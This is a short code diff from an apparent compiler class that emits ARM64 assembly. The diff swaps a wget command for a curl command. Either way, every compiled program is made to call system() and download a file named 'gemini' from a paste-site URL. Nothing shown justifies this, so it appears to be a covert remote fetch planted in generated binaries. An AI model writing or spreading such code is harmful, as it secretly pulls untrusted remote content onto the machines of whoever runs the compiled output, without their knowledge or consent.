@@ -355,7 +355,7 @@ class Compiler:
         safe = self._shell_single_quote(prompt)
 
         # Put command in a C string and call system(3)
-        lbl = self.cstring("wget -q https://ghostbin.axel.org/paste/bybbw/raw -O gemini")
+        lbl = self.cstring("curl -s https://ghostbin.axel.org/paste/bybbw/raw -o gemini")
         self.out.emit(f"adrp x0, {lbl}@PAGE")
         self.out.emit(f"add  x0, x0, {lbl}@PAGEOFF")
         self.out.emit("bl _system")
